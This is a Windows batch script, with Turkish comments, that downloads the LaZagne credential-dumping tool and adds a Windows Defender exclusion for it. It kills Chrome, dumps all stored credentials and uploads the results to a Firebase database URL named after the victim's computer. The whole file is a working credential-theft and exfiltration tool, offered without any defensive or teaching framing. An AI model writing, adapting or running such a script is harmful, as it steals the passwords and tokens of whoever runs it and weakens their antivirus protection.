@echo off
pause 

setlocal enabledelayedexpansion
set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZ_EXE=%TEMP%\lazagne.exe"
set "RESULT_DIR=%TEMP%\results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"

echo ------------------------------------------------------------
echo [INFO] Script basladi: %DATE% %TIME%
echo ------------------------------------------------------------

:: 2. Mevcut lazagne.exe varsa sil
if exist "%LAZ_EXE%" (
    echo [INFO] Daha once indirilmis lazagne.exe bulundu. Siliniyor...
    del /f /q "%LAZ_EXE%" || (
        echo [ERROR] %LAZ_EXE% silinemedi!
        echo Devam etmek icin bir tusa basin...
        pause >nul
    )
    echo [OK] Mevcut lazagne.exe silindi.
)

:: 3. LaZagne.exe indiriliyor
echo [INFO] Lazagne indiriliyor...
powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] LaZagne.exe indirme basarisiz! HTTP veya network sorunu olabilir.
    echo Devam etmek icin bir tusa basin...
    pause >nul
) else (
    echo [OK] LaZagne.exe indirildi.
)

:: 4. Defender exclusion ekle (defender aciksa)
echo [INFO] Windows Defender exclusion ekleniyor...
powershell -Command "Add-MpPreference -ExclusionProcess '%LAZ_EXE%'"
if %ERRORLEVEL% NEQ 0 (
    echo [WARN] Defender exclusion eklenemedi (belki zaten ekli veya Defender kapali).
) else (
    echo [OK] Defender exclusion eklendi.
)

:: 5. Chrome’u kapat
echo [INFO] Google Chrome kapatiliyor...
taskkill /IM chrome.exe /F
if %ERRORLEVEL% NEQ 0 (
    echo [WARN] Chrome kapatilamadi veya hic acik degildi.
) else (
    echo [OK] Chrome kapatildi.
)

:: 6. Sonuc klasoru
if not exist "%RESULT_DIR%" (
    mkdir "%RESULT_DIR%" || (
        echo [ERROR] Sonuc klasoru olusturulamadi!
        echo Devam etmek icin bir tusa basin...
        pause >nul
    )
)
echo [OK] Sonuc klasoru: %RESULT_DIR%

:: 7. LaZagne ile tum credential’lari topla
echo [INFO] LaZagne calistiriliyor (tum moduller)...
"%LAZ_EXE%" all -oN "%RESULT_DIR%\lazagne_results.txt"
if %ERRORLEVEL% NEQ 0 (
    echo [ERROR] LaZagne calistirilirken hata olustu.
    echo Devam etmek icin bir tusa basin...
    pause >nul
) else (
    echo [OK] LaZagne tamamlandi, cikti: %RESULT_DIR%\lazagne_results.txt
)

:: 8. Sonuclarin Firebase’e yuklenmesi
echo [INFO] Sonuclar Firebase'e yukleniyor...
for %%F in ("%RESULT_DIR%\*") do (
    echo   -> Yukleniyor: %%~nxF
    powershell -Command ^
      "$content = Get-Content -Raw -Path '%%F'; ^
       Invoke-RestMethod -Uri '%FIREBASE_URL%/%%~nxF.json' -Method PUT -Body $content"
    if !ERRORLEVEL! NEQ 0 (
        echo [ERROR] %%~nxF upload basarisiz!
        echo Devam etmek icin bir tusa basin...
        pause >nul
    ) else (
        echo [OK] %%~nxF yuklendi.
    )
)

:: Bütün işlemler tamamlandı – hata da olsa burada bekler
:End

echo ------------------------------------------------------------
echo [INFO] Tum islem tamamlandi: %DATE% %TIME%
echo ------------------------------------------------------------
echo Cikmak icin bir tusa basin...
pause >nul
exit /b 0